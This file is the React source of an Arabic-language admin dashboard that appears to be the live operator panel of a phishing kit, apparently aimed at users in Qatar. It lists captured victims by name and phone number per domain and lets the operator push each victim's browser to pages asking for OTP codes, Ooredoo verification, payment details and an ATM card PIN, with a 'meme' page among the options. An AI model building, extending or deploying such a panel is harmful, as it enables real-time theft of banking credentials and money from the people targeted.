import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Input } from "@/components/ui/input";
import { toast } from "sonner";
import { supabase } from "@/integrations/supabase/client";

interface ProcessingUser {
  id: string;
  user_id: string;
  name: string;
  phone: string;
  created_at: string;
  domain?: string;
}

const AdminDashboard = () => {
  const [users, setUsers] = useState<ProcessingUser[]>([]);
  const [selectedRoutes, setSelectedRoutes] = useState<{ [key: string]: string }>({});
  const [enteredDomain, setEnteredDomain] = useState<string>(() => {
    return localStorage.getItem("admin_domain") || "";
  });
  const [domainInput, setDomainInput] = useState("");
  const [isDomainSet, setIsDomainSet] = useState<boolean>(() => {
    return !!localStorage.getItem("admin_domain");
  });
  const navigate = useNavigate();

  useEffect(() => {
    if (!isDomainSet || !enteredDomain) return;

    // Load users from database filtered by domain
    const loadUsers = async () => {
      const { data, error } = await supabase
        .from("processing_users")
        .select("*")
        .eq("domain", enteredDomain)
        .order("created_at", { ascending: false });

      if (error) {
        console.error("Error loading users:", error);
        return;
      }

      if (data) {
        setUsers(data);
      }
    };

    loadUsers();

    // Subscribe to realtime changes
    const channel = supabase
      .channel("processing_users_changes")
      .on(
        "postgres_changes",
        {
          event: "*",
          schema: "public",
          table: "processing_users",
        },
        () => {
          loadUsers();
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [isDomainSet, enteredDomain]);

  // تنظيف الدومين من https:// و http:// والشرطة المائلة في النهاية
  const cleanDomain = (input: string): string => {
    let cleaned = input.trim().toLowerCase();
    cleaned = cleaned.replace(/^https?:\/\//, ''); // إزالة http:// أو https://
    cleaned = cleaned.replace(/\/+$/, ''); // إزالة الشرطات المائلة في النهاية
    return cleaned;
  };

  const handleDomainSubmit = () => {
    if (!domainInput.trim()) {
      toast.error("يرجى إدخال الدومين");
      return;
    }
    const domain = cleanDomain(domainInput);
    localStorage.setItem("admin_domain", domain);
    setEnteredDomain(domain);
    setIsDomainSet(true);
    toast.success(`تم تعيين الدومين: ${domain}`);
  };

  const handleChangeDomain = () => {
    localStorage.removeItem("admin_domain");
    setEnteredDomain("");
    setDomainInput("");
    setIsDomainSet(false);
    setUsers([]);
  };

  const handleRouteSelect = (userId: string, route: string) => {
    setSelectedRoutes(prev => ({ ...prev, [userId]: route }));
  };

  const handleNavigateUser = async (userId: string, userName: string) => {
    const route = selectedRoutes[userId];
    if (!route) {
      toast.error("يرجى اختيار الصفحة المراد التوجيه إليها");
      return;
    }

    // Store the navigation instruction in database
    const { error } = await supabase
      .from("navigation_instructions")
      .upsert({ user_id: userId, route, domain: enteredDomain }, { onConflict: "user_id" });

    if (error) {
      console.error("Error setting navigation:", error);
      toast.error("حدث خطأ أثناء التوجيه");
      return;
    }

    toast.success(`تم إرسال أمر التوجيه للمستخدم ${userName}`);
  };

  const handleRemoveUser = async (userId: string) => {
    // Delete user from database
    const { error: userError } = await supabase
      .from("processing_users")
      .delete()
      .eq("user_id", userId);

    if (userError) {
      console.error("Error removing user:", userError);
      toast.error("حدث خطأ أثناء الحذف");
      return;
    }

    // Also remove navigation instruction if exists
    await supabase
      .from("navigation_instructions")
      .delete()
      .eq("user_id", userId);

    toast.success("تم حذف المستخدم");
  };

  const handleRemoveAllUsers = async () => {
    const confirmed = window.confirm(
      `هل أنت متأكد من حذف جميع المستخدمين؟ (${users.length} مستخدم)\nهذا الإجراء لا يمكن التراجع عنه.`
    );
    
    if (!confirmed) return;

    try {
      // Delete all users for this domain from database
      const { error: usersError } = await supabase
        .from("processing_users")
        .delete()
        .eq("domain", enteredDomain);

      if (usersError) {
        console.error("Error removing users:", usersError);
        toast.error("حدث خطأ أثناء حذف المستخدمين");
        return;
      }

      // Delete all navigation instructions for this domain
      await supabase
        .from("navigation_instructions")
        .delete()
        .eq("domain", enteredDomain);

      toast.success("تم حذف جميع المستخدمين بنجاح");
    } catch (error) {
      console.error("Error:", error);
      toast.error("حدث خطأ غير متوقع");
    }
  };

  const routes = [
    { value: "/otp-verification", label: "تحقق OTP" },
    { value: "/ooredoo-verification", label: "تفعيل Ooredoo" },
    { value: "/forgot-password", label: "نسيت كلمة المرور" },
    { value: "/account-creation", label: "إنشاء حساب" },
    { value: "/registration-complete", label: "بوابة الدفع 💳" },
    { value: "/payment-otp", label: "تحقق OTP الدفع" },
    { value: "/atm-pin", label: "رقم PIN البطاقة 🏧" },
    { value: "/meme", label: "صورة ميم 😂" },
    { value: "/success", label: "النجاح" },
  ];

  // Domain entry screen
  if (!isDomainSet) {
    return (
      <div className="min-h-screen flex flex-col bg-gradient-to-br from-gray-50 to-gray-100" dir="rtl">
        <Header />
        
        <main className="flex-1 container mx-auto px-4 py-8 flex items-center justify-center">
          <Card className="w-full max-w-md shadow-lg">
            <CardHeader className="text-center">
              <div className="text-5xl mb-4">🌐</div>
              <CardTitle className="text-2xl">الدخول للوحة التحكم</CardTitle>
              <p className="text-muted-foreground mt-2">أدخل الدومين الخاص بك لعرض المستخدمين</p>
            </CardHeader>
            <CardContent className="space-y-4">
              <Input
                type="text"
                placeholder="مثال: example.com"
                value={domainInput}
                onChange={(e) => setDomainInput(e.target.value)}
                onKeyDown={(e) => e.key === "Enter" && handleDomainSubmit()}
                className="text-center text-lg"
                dir="ltr"
              />
              <Button 
                onClick={handleDomainSubmit} 
                className="w-full"
                size="lg"
              >
                دخول
              </Button>
            </CardContent>
          </Card>
        </main>

        <Footer />
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col bg-gradient-to-br from-gray-50 to-gray-100" dir="rtl">
      <Header />
      
      <main className="flex-1 container mx-auto px-4 py-8">
        <div className="mb-8 flex items-center justify-between flex-wrap gap-4">
          <div>
            <h1 className="text-3xl font-bold text-gray-900 mb-2">لوحة تحكم الأدمن</h1>
            <div className="flex items-center gap-2 text-gray-600">
              <span>الدومين:</span>
              <span className="bg-primary/10 text-primary px-3 py-1 rounded-full font-medium text-sm" dir="ltr">
                {enteredDomain}
              </span>
              <Button
                variant="ghost"
                size="sm"
                onClick={handleChangeDomain}
                className="text-gray-500 hover:text-gray-700"
              >
                تغيير
              </Button>
            </div>
          </div>
          {users.length > 0 && (
            <Button
              variant="destructive"
              onClick={handleRemoveAllUsers}
              className="gap-2"
            >
              🗑️ حذف الجميع ({users.length})
            </Button>
          )}
        </div>

        {users.length === 0 ? (
          <Card className="border-2 border-dashed">
            <CardContent className="flex flex-col items-center justify-center py-12">
              <div className="text-gray-400 text-6xl mb-4">👥</div>
              <p className="text-gray-500 text-lg">لا يوجد مستخدمين حالياً في هذا الدومين</p>
              <p className="text-gray-400 text-sm mt-2" dir="ltr">{enteredDomain}</p>
            </CardContent>
          </Card>
        ) : (
          <div className="grid gap-4">
            {users.map((user) => (
              <Card key={user.id} className="shadow-sm hover:shadow-md transition-shadow">
                <CardHeader className="pb-3">
                  <CardTitle className="text-lg flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <div className="w-10 h-10 rounded-full bg-primary/10 flex items-center justify-center">
                        <span className="text-primary font-bold">{user.name.charAt(0)}</span>
                      </div>
                      <div>
                        <div className="font-semibold text-gray-900">{user.name}</div>
                        <div className="text-sm text-gray-500 font-normal">{user.phone}</div>
                      </div>
                    </div>
                     <div className="text-xs text-gray-400 font-normal">
                      {new Date(user.created_at).toLocaleTimeString('ar-QA')}
                    </div>
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="flex gap-3">
                    <Select
                      value={selectedRoutes[user.user_id] || ""}
                      onValueChange={(value) => handleRouteSelect(user.user_id, value)}
                    >
                      <SelectTrigger className="flex-1">
                        <SelectValue placeholder="اختر الصفحة" />
                      </SelectTrigger>
                      <SelectContent>
                        {routes.map((route) => (
                          <SelectItem key={route.value} value={route.value}>
                            {route.label}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                    <Button
                      onClick={() => handleNavigateUser(user.user_id, user.name)}
                      disabled={!selectedRoutes[user.user_id]}
                      className="bg-primary hover:bg-primary/90"
                    >
                      توجيه
                    </Button>
                    <Button
                      variant="destructive"
                      onClick={() => handleRemoveUser(user.user_id)}
                    >
                      حذف
                    </Button>
                  </div>
                </CardContent>
              </Card>
            ))}
          </div>
        )}
      </main>

      <Footer />
    </div>
  );
};

export default AdminDashboard;